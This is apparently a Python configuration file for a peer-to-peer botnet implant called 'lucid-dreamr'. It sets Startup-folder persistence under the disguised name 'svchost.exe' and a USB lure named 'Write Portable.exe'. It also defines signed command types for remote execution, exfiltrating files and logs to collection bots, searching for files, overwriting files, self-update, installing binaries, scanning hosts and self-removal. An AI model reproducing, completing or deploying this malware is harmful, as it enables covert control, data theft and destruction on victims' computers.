### GLOBAL CONFIG ###
BUILD_NAME = "lucid-dreamr"
TCP_PORT    = 8888
WEB_PORT    = 8000
FTP_PORT    = 8080
FTP_DPORT   = 4200
PROXY_PORT  = 9001
TCP_TIMEOUT = 3
BUFFER_SIZE = 1024
RSA_KEY_LEN = 2048
VERSION     = 3331
DEBUG_MODE  = True
MSG_EXPIRE  = 420
HOST_EXPIRE = 604800 # Hosts invalidated after 7 days no check in
LOADR_SIZE  = 240128
USB_NAME    = "Write Portable.exe"
TRUSTED_KEY = '''-----BEGIN RSA PUBLIC KEY-----
-----END RSA PUBLIC KEY-----'''

# Decide the correct locations to store files
import os
import platform
box = platform.platform()

# This is a Windows XP, Server 2003, Server 2000 readme ehem
if ("Windows-XP" in box or "2003" in box or "2000" in box):
	BasePath = "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\"
	BinaryLocation = BasePath + "svchost.exe"
	WebPath        = BasePath + "www\\"  # Folder where the binary will sit
	KeyPath        = BasePath + "cert\\" # sep because of http server
	DreamrLocation = BasePath + "dreamr.exe"

# Windows Modern Edition
else:
	BasePath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
	BinaryLocation = BasePath + "svchost.exe"
	WebPath        = BasePath + "www\\"  # Folder where the binary will sit
	KeyPath        = BasePath + "cert\\" # sep because of http server
	ContentPath    = BasePath + "content\\"
	DreamrLocation = BasePath + "dreamr.exe"

# Lucid Dreamr
import sys
if "lucid-dreamr" in sys.argv[0]:
	BasePath       = "%s\\" % os.getcwd()
	BinaryLocation = BasePath + "svchost.exe"
	WebPath        = BasePath + "www\\"  # Folder where the binary will sit
	KeyPath        = BasePath + "cert\\" # sep because of http server
	DreamrLocation = BasePath + "dreamr.exe" # not that we need this or anything

# Commands that would return data will report back to the specified lucid-dreamr address
# this would likely be a btc vps, rdp, or w/e someone would try and use

# NETWORK:         Keep the network alive.
# COMMAND DISTRIB: Signed command is run and the output is ignored.
# COMMAND DRETURN: Signed command is run and the output is collected by the specified host.

### TEST TYPES (NO CRYPT) ###
TYPE_UNUSED          = 0
TYPE_NETWORK_TEST    = 1 # Send unencrypted message to another host. (register)
TYPE_NETWORK_FILE    = 2 # Send a previously encrypted file to another host (And a TYPE_NETWORK_KEY ahead of it)
TYPE_NETWORK_RESULT  = 3 # Send encrypted command output to the other side. (with the TYPE_NETWORK_KEY)
TYPE_NETWORK_SYNC    = 4 # Share network updates. (hostlsit, command forwarding)

### UNTRUSTED ENCRYPTED MESSAGE TYPES ###
#TYPE_NETWORK_SYNC    = 10  # Share network updates. (hostlsit, command forwarding)
TYPE_NETWORK_HOST    = 11 # A single good host from a server
TYPE_NETWORK_KEY     = 12 # 256 Bit AES key related to a specific future message ID. (The key expires in one minute)
TYPE_DOWNLOAD_FILE   = 13 # Download file over HTTP given a URL

#### TRUSTED ENCRYPTED MESSAGE TYPES ###
TYPE_MELT            = 20 # The remote implants should melt
TYPE_EXEC            = 21 # Selected hosts run the command
TYPE_COUNT_REQUEST   = 22 # Send network tests containing "count" to a DreamrServer which records the number of counts
TYPE_SCAN_REQUEST    = 23 # Scan a host, and send the results to another infected host
TYPE_INFO_REQUEST    = 24 # Send host information to another bot
TYPE_LOG_REQUEST     = 25 # Send logs to another bot
TYPE_FILE_REQUEST    = 26 # Ask host to send a specific file to another host
TYPE_EXEC_REQUEST    = 27 # Ask host to execute a commmand and return the results to another host
TYPE_FIND_REQUEST    = 28 # Have selected bot(s) search for files containing "string", and send results to a collection bot.
TYPE_GARBAGE_FILE    = 29 # Overwrites file giving a file location.
TYPE_UPDATE          = 30 # Update self with new bin
TYPE_CLEAR_KEYSTORE  = 31 # Clear the keystore
TYPE_VALID_FILE      = 32 # Hash of a valid file without the filename (sha-1)
TYPE_INSTALL         = 33 # Share and execute the following binary

# reserved until 100 for trusted

### SELECTOR TYPES ###
SELECTOR_TYPE_PROBABILITY = 0 # 1/value chance
SELECTOR_TYPE_LAYER3 = 1 # if value == self.hostAddr
SELECTOR_TYPE_LAYER2 = 2 # if value == self.hostMAC
